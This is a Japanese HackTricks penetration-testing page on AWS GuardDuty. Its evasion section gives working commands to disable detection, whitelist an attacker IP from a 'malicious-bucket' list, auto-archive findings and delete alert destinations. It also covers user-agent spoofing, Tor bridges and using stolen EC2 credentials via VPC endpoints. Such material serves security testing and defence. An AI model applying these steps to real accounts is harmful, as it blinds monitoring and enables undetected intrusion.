# AWS - GuardDuty Enum

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## GuardDuty

Amazon GuardDutyは、AWSが提供する最初の種類の地域ベースのインテリジェントな**脅威検出サービス**であり、ユーザーは**VPCフローログ、AWS CloudTrail管理イベントログ、CloudTrail S3データイベントログ、およびDNSログ**を分析することで、**AWSアカウント**を**異常な挙動や予期しない挙動**からモニタリングすることができます。GuardDutyは、悪意のあるIPアドレスやドメインのリストなどの**脅威インテリジェンスフィード**と**機械学習**を使用して、AWS環境内での**予期しないおよび潜在的に不正な活動**を特定します。これには特権のエスカレーション、公開された資格情報の使用、または悪意のあるIPアドレスやドメインとの通信などの問題が含まれます。

アラートは**GuardDutyコンソール（90日）**とCloudWatchイベントに表示されます。

たとえば、GuardDutyは、マルウェアやビットコインのマイニングを提供する**侵害されたEC2インスタンス**を検出することができます。また、AWSアカウントの**アクセス動作を監視**し、未使用の**リージョンにデプロイされたインスタンス**やパスワードポリシーの変更などの**異常なAPI呼び出し**など、侵害の兆候を検出します。\
GuardDutyには、ホワイトリストとブラックリストのIPアドレスのリストを**アップロード**することができます。

検出の概要：

* 検出タイプ
* 重要度：7-8.9高、4-6.9中、01-3.9低
* リージョン
* アカウントID
* リソースID
* 検出時刻
* 使用された脅威リスト

本文には次の情報が含まれます：

* 影響を受けるリソース
* アクション
* アクター：IPアドレス、ポート、ドメイン
* 追加情報

他のアカウントを異なるAWS GuardDutyアカウントに**招待する**ことで、**すべてのアカウントが同じGuardDutyから監視**されるようにすることができます。マスターアカウントはメンバーアカウントを招待し、その後、メンバーアカウントの代表者が招待を受け入れる必要があります。\
GuardDutyには、情報を取得するためのさまざまなIAMロールの権限があり、ユーザーが**ホワイトリストとブラックリストのIPをアップロード**することを許可します。\
GuardDutyは、影響を受けるエンドポイントからメタデータを取得するための「AWSServiceRoleForAmazonGuardDuty」というサービスリンクドロールを使用します。

ログファイルの処理には、CloudTrailからの1ミリオンイベントごとの処理と、VPC Flowからの解析ログごとのGBごとの処理に対して料金が発生します。

ユーザーがGuardDutyを**無効にする**と、AWS環境の監視が停止し、新しい検出は生成されなくなり、**既存の検出も失われます**。\
ただし、停止するだけの場合は、既存の検出は残ります。

## アクション

### 列挙
```bash
aws guardduty list-organization-admin-accounts
aws guardduty list-invitations
aws guardduty get-invitations-count
aws guardduty list-detectors
aws guardduty describe-organization-configuration --detector-id <id>
aws guardduty get-detector --detector-id <id>
aws guardduty list-filters --detector-id <id>
aws guardduty get-filter --detector-id <id> --filter-name
aws guardduty list-findings --detector-id <id>
aws guardduty get-findings --detector-id <id> --finding-ids <id>
aws guardduty get-findings-statistics --detector-id <id> --finding-statistic-types <types>
aws guardduty list-ip-sets --detector-id <id>
aws guardduty list-members --detector-id <id>
aws guardduty list-publishing-destinations --detector-id <id>
aws guardduty list-threat-intel-sets --detector-id <id>
aws guardduty list-ip-sets
aws guardduty get-ip-set --detector-id <id>
aws guardduty get-master-account --detector-id <id>
aws guardduty get-members --detector-id <id> --account-ids <id>
aws guardduty get-member-detectors --detector-id <id> --account-ids <id>
aws guardduty get-threat-intel-set --detector-id <id> --threat-intel-set-id <id>
```
## 検出を回避する

### `guardduty:ListDetectors`, `guardduty:UpdateDetector`

これらの権限を持っていると、アラートをトリガーすることを避けるためにGuardDutyを無効にすることができます。
```bash
# Disabling the detector
aws guardduty update-detector \
--detector-id <detector-id> \
--no-enable

# Removing s3 as a log source
aws guardduty update-detector \
--detector-id <detector-id> \
--data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
--detector-id <detector-id> \
--finding-publishing-frequency SIX_HOURS
```
### `guardduty:ListDetectors`, `guardduty:ListIPSet`, `iam:PutRolePolicy`, (`guardduty:CreateIPSet`|`guardduty:UpdateIPSet`)

攻撃者は、GuardDutyの[信頼されたIPリスト](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_upload-lists.html)を作成または更新することができます。その中には、**自分自身のIPアドレスも含まれます**。信頼されたIPリストに含まれるIPアドレスは、CloudtrailやVPCフローログのアラートが発生しません。

{% hint style="info" %}
DNSの検出結果は、信頼されたIPリストの対象外です。
{% endhint %}
```
aws guardduty update-ip-set \
--detector-id <detector-id> \
--ip-set-id 24adjigdk34290840348exampleiplist \
--location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
--activate
```
{% hint style="info" %}
必要なステルスレベルに応じて、ファイルはターゲットアカウントのs3バケットにアップロードされるか、攻撃者が制御するアカウントにアップロードされることがあります。
{% endhint %}

### `guardduty:CreateFilter`

新しく作成されたGuardDutyの調査結果は、[抑制ルール](https://docs.aws.amazon.com/guardduty/latest/ug/findings\_suppression-rule.html)を介して自動的にアーカイブされることがあります。攻撃者は、生成される可能性のある調査結果を自動的にアーカイブするために、[フィルタ](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_filter-findings.html)を使用することができます。

フィルタは、[CreateFilter API](https://docs.aws.amazon.com/guardduty/latest/APIReference/API\_CreateFilter.html)を使用して作成することができます。
```
aws guardduty create-filter \
--action ARCHIVE \
--detector-id <detector-id> \
--name yourfiltername \
--finding-criteria file://criteria.json
```
### `guardduty:DeletePublishingDestination`

攻撃者は、アラートの宛先を[削除すること](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html)によって、アラートの通知を無効にすることができます。
```
aws guardduty delete-publishing-destination \
--detector-id <detector-id> \
--destination-id def456
```
### ペントテストの結果

GuardDutyは一般的なペネトレーションテストのAWS APIリクエストを検出し、[ペントテストの結果](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#pentest-iam-kalilinux)をトリガーします。\
APIリクエストで渡される**ユーザーエージェント名**によって検出されます。\
したがって、**ユーザーエージェントを変更**することで、GuardDutyが攻撃を検出しないようにすることが可能です。

Ubuntu、Mac、WindowsなどのOSを使用すると、このアラートがトリガーされなくなります。

これを防ぐためには、`botocore`パッケージ内の`session.py`スクリプトを検索します。Kali Linuxでは、`/usr/local/lib/python3.7/dist-packages/botocore/session.py`にあります。

[456行目](https://github.com/boto/botocore/blob/7de36c07ecec503f588ac27658b1795e83b67b75/botocore/session.py#L456)付近に`platform.system()`と`platform.release()`が表示されます。これを[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/user_agents.txt)にあるような**正当なユーザーエージェント文字列で置き換えます**。

### Torクライアントの結果

**Tor**から接続すると、**GuardDuty**は[**UnauthorizedAccess:EC2/TorClient**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html#unauthorizedaccess-ec2-torclient)**というアラートを設定します**。

GuardDutyは、[Torノードの公開リスト](https://metrics.torproject.org/exonerator.html)によってこれを検出します。

Torを介して接続する必要がある場合は、[**Bridges**](https://community.torproject.org/relay/types-of-relays/#Bridge)を使用してこれをバイパスすることができます。ただし、接続にTorを使用しない方が良いでしょう。

ブリッジを使用するには、[Obfs4](https://gitlab.com/yawning/obfs4) (`apt install tor obfs4proxy`)を使用し、[bridges.torproject.org](https://bridges.torproject.org/options)からブリッジアドレスを取得します。

ここから、次のようなtorrcファイルを作成します。
```
UseBridges 1
Bridge obfs4 <IP ADDRESS>:<PORT> <FINGERPRINT> cert=<cert_string> iat-mode=0
ClientTransportPlugin obfs4 exec /bin/obfs4proxy
```
楽しい `tor -f torrc` で、通常のポート9050でソックス5プロキシに接続できます。

### 資格情報の流出検知

もし、**EC2の資格情報を盗み出し**、それを**AWSインフラストラクチャの外部で使用**する場合、アラート [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws) がトリガーされます。

さらに、**自分自身のEC2インスタンス**を使用して、**盗まれた資格情報**を使用する場合、アラート [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationinsideaws) がトリガーされます。

ただし、現在、これをバイパスする方法があります - [VPCエンドポイント](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html)を使用することです。**VPCエンドポイント**を使用すると、GuardDutyのアラートは**トリガーされません**。つまり、攻撃者としては、`EC2インスタンスからIAMの資格情報を盗み出した場合、VPCエンドポイントを介して自分自身のEC2インスタンスからそれらの資格情報を使用することができます。これにより、GuardDutyの検出は行われません`。

ツール [**SneakyEndpoints**](https://github.com/Frichetten/SneakyEndpoints) は、このプロセスを自動化するために作成されました。このプロジェクトは、Terraformを使用して攻撃環境を構築します。インターネットアクセスのないプライベートサブネットにEC2インスタンスを作成し、使用するための複数のVPCエンドポイントを作成します。

このアラートをバイパスする**別の方法**は、盗まれた資格情報を**盗まれたマシンと同じマシン**または**同じアカウントのマシン**で使用することです。

## 参考文献

* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/)
* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/)
* [https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/](https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/)
* [https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/](https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/)

<details>

<summary><strong>ハックトリックをサポートして特典を受け取る！</strong></summary>

* **HackTricksで会社を宣伝**したい場合や、**PEASSの最新バージョンを入手**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう。

</details>
